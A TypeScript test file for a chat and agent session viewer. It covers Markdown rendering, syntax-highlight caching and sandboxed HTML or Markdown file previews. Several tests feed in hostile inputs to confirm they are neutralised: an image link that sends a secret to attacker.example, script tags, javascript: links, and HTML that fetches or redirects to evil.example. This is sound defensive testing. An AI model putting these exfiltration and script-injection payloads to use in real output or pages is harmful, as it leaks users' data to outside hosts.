import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";
import { FilePreview } from "../src/renderer/src/components/FilePreview";
import { Markdown, unwrapOuterMarkdownFence } from "../src/renderer/src/components/Markdown";
import { ToolEntry } from "../src/renderer/src/components/SessionView";
import {
  buildHtmlSrcDoc,
  diffPreviewContent,
  extractToolFilePreview,
  parseDiff,
  previewKind,
  splitFrontmatter,
} from "../src/renderer/src/filePreview";
import { cachedHighlight, rememberHighlight } from "../src/renderer/src/highlightCache";

describe("Markdown", () => {
  it("never loads an image from an answer, but says it's there", () => {
    const html = renderToStaticMarkup(<Markdown text="Your report: ![report](https://attacker.example/collect?d=secret)" />);
    expect(html).not.toContain("<img");
    expect(html).toContain("report");
    expect(html).toContain('title="Image not loaded: https://attacker.example/collect?d=secret"');
  });

  it("shows raw HTML as text instead of rendering it", () => {
    const html = renderToStaticMarkup(<Markdown text={'<img src="https://attacker.example/x"> and <script>alert(1)</script>'} />);
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;script&gt;");
  });

  it("drops unsafe link targets", () => {
    const html = renderToStaticMarkup(<Markdown text="[click](javascript:alert(1))" />);
    expect(html).not.toContain("javascript:");
  });

  it("unwraps an outer ```markdown or ```md code fence so responses wrapped in a fence render as Markdown", () => {
    const wrapped = "```markdown\n# Implementation Plan\n\n- **Step 1**: Parse `config.ts`\n- **Step 2**: Run tests\n```";
    expect(unwrapOuterMarkdownFence(wrapped)).toBe("# Implementation Plan\n\n- **Step 1**: Parse `config.ts`\n- **Step 2**: Run tests");

    // Also unwraps an unclosed outer fence while streaming
    const streamingWrapped = "```md\n## Streaming Heading\n\n1. First item";
    expect(unwrapOuterMarkdownFence(streamingWrapped)).toBe("## Streaming Heading\n\n1. First item");

    const html = renderToStaticMarkup(<Markdown text={wrapped} />);
    expect(html).toContain("<h1>Implementation Plan</h1>");
    expect(html).toContain("<strong>Step 1</strong>");
    expect(html).toContain("<code>config.ts</code>");
    expect(html).not.toContain("<pre>");
  });

  it("renders embedded ```markdown code blocks as processed Markdown previews with Preview/Raw toggle", () => {
    const text = "Here is the drafted document:\n\n```markdown\n## Release Notes\n\n- Added `Markdown` support\n```\n\nLet me know if that works.";
    const html = renderToStaticMarkup(<Markdown text={text} />);
    expect(html).toContain('data-testid="md-fence-block"');
    expect(html).toContain('data-testid="md-fence-rendered"');
    expect(html).toContain("<h2>Release Notes</h2>");
    expect(html).toContain("<code>Markdown</code>");
  });

  it("splits YAML frontmatter in direct Markdown responses instead of rendering a setext heading", () => {
    const md = "---\ntitle: Investigation Report\nstatus: Complete\n---\n## Findings\n\nEverything is green.";
    const html = renderToStaticMarkup(<Markdown text={md} />);
    expect(html).toContain('data-testid="md-frontmatter"');
    expect(html).toContain("Investigation Report");
    expect(html).toContain("<h2>Findings</h2>");
  });

  it("preserves single-line fenced code blocks without a language tag as <pre><code>", () => {
    const md = "Run:\n\n```\nnpm test\n```";
    const html = renderToStaticMarkup(<Markdown text={md} />);
    expect(html).toContain("<pre><code>npm test</code></pre>");
  });

  it("draws a block highlighted at once when the same code was highlighted before", () => {
    // A streamed reply turning final: its blocks were highlighted while it was written.
    const shiki = '<pre class="shiki github-dark"><code><span style="color:#F97583">const</span> a = 1;</code></pre>';
    rememberHighlight("github-dark", "ts", "const a = 1;", shiki);
    const html = renderToStaticMarkup(<Markdown text={"```ts\nconst a = 1;\n```"} />);
    expect(html).toContain(`<div class="shiki-wrap">${shiki}</div>`);
    // Other code, or the same code in another language, waits for its own highlight.
    expect(renderToStaticMarkup(<Markdown text={"```ts\nconst a = 2;\n```"} />)).toContain("<pre><code>const a = 2;</code></pre>");
    expect(renderToStaticMarkup(<Markdown text={"```js\nconst a = 1;\n```"} />)).toContain("<pre><code>const a = 1;</code></pre>");
  });
});

describe("highlight cache", () => {
  it("drops the oldest highlights past about 2 million characters", () => {
    const big = "x".repeat(700_000);
    rememberHighlight("github-dark", "ts", "first", big);
    rememberHighlight("github-dark", "ts", "second", big);
    // Remembered again, so it's the newest of the two.
    rememberHighlight("github-dark", "ts", "first", big);
    rememberHighlight("github-dark", "ts", "third", big);
    expect(cachedHighlight("github-dark", "ts", "second")).toBeUndefined();
    expect(cachedHighlight("github-dark", "ts", "first")).toBe(big);
    expect(cachedHighlight("github-dark", "ts", "third")).toBe(big);
    // A highlight bigger than all of it isn't kept, and pushes nothing out.
    rememberHighlight("github-dark", "ts", "huge", "x".repeat(2_000_001));
    expect(cachedHighlight("github-dark", "ts", "huge")).toBeUndefined();
    expect(cachedHighlight("github-dark", "ts", "first")).toBe(big);
    expect(cachedHighlight("github-dark", "ts", "third")).toBe(big);
  });
});

describe("FilePreview & session .md / .html support", () => {
  it("identifies markdown and html extensions", () => {
    expect(previewKind("README.md")).toBe("markdown");
    expect(previewKind("C:\\wt\\repo\\docs\\Architecture.MD")).toBe("markdown");
    expect(previewKind("notes.markdown")).toBe("markdown");
    expect(previewKind("page.mdx")).toBe("markdown");
    expect(previewKind("index.html")).toBe("html");
    expect(previewKind("ui/report.HTM")).toBe("html");
    expect(previewKind("script.ts")).toBeUndefined();
    expect(previewKind(undefined)).toBeUndefined();
  });

  it("splits YAML frontmatter from Markdown files so it renders as metadata instead of a heading", () => {
    const md = "---\ntitle: Sprint Summary\nauthor: \"ARIA\"\n---\n# Overview\n\n- [x] Done\n";
    const { frontmatter, body } = splitFrontmatter(md);
    expect(frontmatter).toEqual([
      { key: "title", value: "Sprint Summary" },
      { key: "author", value: "ARIA" },
    ]);
    expect(body).toBe("# Overview\n\n- [x] Done\n");

    const rendered = renderToStaticMarkup(<FilePreview path="docs/summary.md" kind="markdown" fallbackContent={md} />);
    expect(rendered).toContain('data-testid="file-preview"');
    expect(rendered).toContain('data-preview-kind="markdown"');
    expect(rendered).toContain('data-testid="md-frontmatter"');
    expect(rendered).toContain("Sprint Summary");
    expect(rendered).toContain("<h1>Overview</h1>");
    expect(rendered).toContain('type="checkbox"');
  });

  it("sanitizes and wraps HTML files for sandboxed iframe preview", () => {
    const raw = `<div onclick="evil()" onload='bad()'><h1>Status Dashboard</h1><script>fetch("https://evil.example")</script><a href="javascript:alert(1)">Link</a><base href="https://evil.example"><meta http-equiv="refresh" content="0;url=https://evil.example"><script>unclosedEvil()</div>`;
    const srcDoc = buildHtmlSrcDoc(raw);
    expect(srcDoc).toContain("data-aria-preview-defaults");
    expect(srcDoc).toContain("default-src 'none'");
    expect(srcDoc).toContain("<h1>Status Dashboard</h1>");
    expect(srcDoc).not.toContain("<script");
    expect(srcDoc).not.toContain("unclosedEvil");
    expect(srcDoc).not.toContain("onclick=");
    expect(srcDoc).not.toContain("onload=");
    expect(srcDoc).not.toContain("javascript:");
    expect(srcDoc).not.toContain("<base");
    expect(srcDoc).not.toContain("url=https://evil.example");

    const rendered = renderToStaticMarkup(<FilePreview path="dashboard.html" kind="html" fallbackContent={raw} />);
    expect(rendered).toContain('data-testid="html-preview-frame"');
    expect(rendered).toContain('sandbox=""');
    expect(rendered).toContain("HTML UI");
  });

  it("extracts preview content from unified diffs and tool entries (including truncated args)", () => {
    const diffText = [
      "diff --git a/docs/plan.md b/docs/plan.md",
      "new file mode 100644",
      "--- /dev/null",
      "+++ b/docs/plan.md",
      "@@ -0,0 +1,3 @@",
      "+# New Plan",
      "+",
      "+| Step | Status |",
    ].join("\n");
    const files = parseDiff(diffText);
    expect(files).toHaveLength(1);
    expect(files[0]!.isNew).toBe(true);
    expect(files[0]!.isDeleted).toBe(false);
    expect(diffPreviewContent(files[0]!)).toBe("# New Plan\n\n| Step | Status |");

    const createEntry = {
      kind: "tool" as const,
      id: "t1",
      at: 1000,
      name: "create",
      args: JSON.stringify({ path: "C:\\wt\\demo\\report.md", file_text: "# Report\n\nAll checks green." }),
      success: true,
      ms: 25,
    };
    const extracted = extractToolFilePreview(createEntry);
    expect(extracted).toEqual({
      path: "C:\\wt\\demo\\report.md",
      kind: "markdown",
      content: "# Report\n\nAll checks green.",
      partial: false,
      isWrite: true,
    });

    const toolHtml = renderToStaticMarkup(<ToolEntry entry={createEntry} />);
    expect(toolHtml).toContain('data-testid="tool-preview-toggle"');
    expect(toolHtml).toContain("Markdown preview");
    expect(toolHtml).toContain("<h1>Report</h1>");
    expect(toolHtml).toContain("All checks green.");

    // Truncated JSON arguments (cut at 4,000 chars before closing quote/brace)
    const truncatedEntry = {
      kind: "tool" as const,
      id: "t2",
      at: 1000,
      name: "create",
      args: '{"path":"ui/index.html","file_text":"<h1>Cut HTML</h1>\\n<p>Still renders',
      argsCut: 520,
      success: true,
    };
    const truncatedPreview = extractToolFilePreview(truncatedEntry);
    expect(truncatedPreview).toEqual({
      path: "ui/index.html",
      kind: "html",
      content: "<h1>Cut HTML</h1>\n<p>Still renders",
      partial: true,
      isWrite: true,
    });
    const truncatedRendered = renderToStaticMarkup(<ToolEntry entry={truncatedEntry} />);
    expect(truncatedRendered).toContain('data-testid="html-preview-frame"');

    // View tool preserves Markdown numbered lists while stripping sequential view line numbers
    const viewNumberedList = extractToolFilePreview({
      kind: "tool",
      id: "t3",
      at: 1000,
      name: "view",
      args: JSON.stringify({ path: "steps.md" }),
      result: "1. First item\n2. Second item",
      success: true,
    });
    expect(viewNumberedList?.content).toBe("1. First item\n2. Second item");

    const viewWithLineNums = extractToolFilePreview({
      kind: "tool",
      id: "t4",
      at: 1000,
      name: "view",
      args: JSON.stringify({ path: "steps.md" }),
      result: "1: # Heading\n2: 1. First item",
      success: true,
    });
    expect(viewWithLineNums?.content).toBe("# Heading\n1. First item");
  });
});

